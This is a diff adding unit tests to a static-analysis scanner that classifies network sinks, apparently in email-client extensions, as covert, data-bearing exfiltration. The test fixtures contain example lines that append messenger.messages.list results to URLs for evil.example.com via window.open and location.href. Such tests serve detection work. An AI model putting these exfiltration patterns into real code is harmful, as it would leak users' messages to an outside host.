@@ -1,7 +1,9 @@
 // Unit tests for the scheme (cleartext) and host fields scanNetworkSinks records
 // on each sink - the data the cleartext-transmission and privacy-policy checks
-// read. The channel/destClass/dataAppended/carriesData fields are covered in
-// rules.test.js alongside the checks that consume them.
+// read - plus the covert-channel classification (the window-open / navigation sink
+// types and carriesData) the disguised-window / disguised-navigation checks gate on.
+// The remaining channel/destClass field combinations are covered in rules.test.js
+// alongside the checks that consume them.
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -165,4 +167,38 @@ test("XHR with a dynamic method keeps its destination", () => {
   const win = one('window.open("http://popup.example.com/p");');
   assert.equal(win.type, "window-open");
   assert.equal(win.host, "popup.example.com");
+});
+
+// The two covert-navigation sinks the disguised-* checks consume: window.open and a
+// location.href assignment. carriesData is the flag that separates a STRONG exfil (a
+// user-data API call inside the URL) from an ordinary navigation, so it is asserted
+// both true (a messenger.messages.* call is present) and false (none is).
+test("window.open carrying a data-API call is a covert, data-bearing sink", () => {
+  const hit = one(
+    'window.open("https://evil.example.com/?d=" + messenger.messages.list(id));'
+  );
+  assert.equal(hit.type, "window-open");
+  assert.equal(hit.channel, "covert");
+  assert.equal(hit.destClass, "remote");
+  assert.equal(hit.carriesData, true);
+
+  // Same sink to the same host, but no data-API call in the URL -> not data-bearing.
+  const plain = one('window.open("https://evil.example.com/p");');
+  assert.equal(plain.type, "window-open");
+  assert.equal(plain.carriesData, false);
+});
+
+test("a location.href navigation carrying a data-API call is covert and data-bearing", () => {
+  const hit = one(
+    'location.href = "https://evil.example.com/?d=" + messenger.messages.list(id);'
+  );
+  assert.equal(hit.type, "navigation");
+  assert.equal(hit.channel, "covert");
+  assert.equal(hit.destClass, "remote");
+  assert.equal(hit.carriesData, true);
+
+  // A runtime value appended with no data-API call is a navigation but not data-bearing.
+  const plain = one('location.href = "https://evil.example.com/u/" + userId;');
+  assert.equal(plain.type, "navigation");
+  assert.equal(plain.carriesData, false);
 });
